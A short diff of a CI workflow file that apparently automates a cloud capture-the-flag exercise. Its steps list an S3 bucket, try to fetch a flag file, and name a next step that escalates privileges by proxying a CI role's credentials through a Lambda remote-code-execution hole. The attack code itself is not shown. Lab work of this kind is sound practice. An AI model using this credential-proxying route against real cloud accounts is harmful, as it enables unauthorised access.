@@ -67,7 +67,8 @@ jobs:
         run: aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
 
       - name: Get the flag
-        run: aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "  (expected: cicdRole is outside the VPC, Statement2 only)"
+        run: |
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "  (expected - cicdRole is outside the VPC, Statement2 only)"
 
       - name: Privesc - proxy cicdRole creds through Lambda RCE (inside VPC)
         run: |
